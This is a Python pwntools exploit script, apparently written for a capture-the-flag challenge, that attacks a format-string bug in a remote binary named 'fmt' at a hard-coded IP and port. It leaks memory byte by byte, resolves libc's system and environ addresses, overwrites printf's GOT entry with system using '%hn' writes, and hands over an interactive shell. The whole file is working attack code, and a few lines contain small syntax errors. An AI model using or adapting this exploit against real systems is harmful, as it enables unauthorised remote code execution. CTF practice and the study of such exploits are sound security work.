from pwn import *
import json
import telnetlib
import sys

if not os.path.isfile('fmt.json'):
	os.system('touch fmt.json')

try:
	obj = json.load(open('fmt.json'))
except e as Exception:
	print e
	obj = {}

def save():
	json.dump(obj, open('fmt.json', 'w'))

elf = ELF('/media/sf_j/Downloads/fmt')
# HOST, PORT = '0.0.0.0', 8012
HOST, PORT = '103.237.99.75', 23505
# HOST, PORT = '118.70.80.143', 23505
def recvuntil(r, t):
	d = ''
	while t not in d:
		c = r.recv(1)
		if c == '':
			break
		d += c
	return d
def fsb(payload, ptrs):
	global HOST, PORT
	payload = payload.ljust(128) + ptrs
	print `payload`
	while True:
		try:
			r = socket.create_connection((HOST, PORT))
			break
		except:
			PORT += 1
			continue
	raw_input('>> ')
	recvuntil(r, 'Give me a name\n')
	r.send(payload + '\n')
	return r
def leak(addr):
	if str(addr) in obj:
		return obj[str(addr)].decode('hex')
	r = fsb('%22$s~end', p64(addr))
	data = recvuntil(r, '~end')[:-4] + '\x00'
	if str(addr) in obj and data.encode('hex') != obj[str(addr)]:
		print 'wtf', hex(addr), obj[str(addr)], data.decode('hex')
		exit()
	print hex(addr), `data`
	obj[addr] = data.encode('hex')
	save()
	r.close()
	return data

def leakn(addr, size=8):
	result = ''
	while size > 0:
		data = leak(addr) + '\x00'
		size -=   len(data)
		addr +=   len(data)
		result += data
	return result

# print hex(u64(leakn(0x601040)))
# print hex(u64(leakn(0x601050)))

d = DynELF(leak, 0x400000, elf)
stack = u64(leakn(d.lookup('environ', 'libc')))

system = d.lookup('__libc_system', 'libc')
# stack = d.stack() | 0x7fff << 32
# print hex(stack)
print hex(system)
print hex(stack)

printf_got = 0x601028

h = lambda x: ('%' + str(x & 0xffff) + 'c') if x & 0xffff > 0 else ''
stack = 0x7fffffffecc0 - 8
# system = 0x400786
# system = 0x4142434445464748

def write(values, addrs):
	l = zip((x & 0xffff for x in values), addrs)
	l = sorted(l, key=lambda x: x[0])
	addrs = (x[1] for x in l)
	prev = 0
	print l
	addr_index = 22
	payload = ''
	for value, addr in l:
		payload += h(value - prev)
		payload += '%' + str(addr_index) + '$hn'
		addr_index += 1
		prev = value
	return fsb(payload, ''.join(addrs))

# stack = 0x601f00
while True:
	r = write((0x0786, 0x40, 0, 0, system, system >> 16, system >> 32, system >> 48), (p64(stack), p64(stack + 2), p64(stack + 4), p64(stack + 6), p64(printf_got), p64(printf_got + 2), p64(printf_got + 4), p64(printf_got + 6)))
	t = telnetlib.Telnet()
	t.sock = r
	t.interact()
	print hex(stack)
	break
	stack -= 2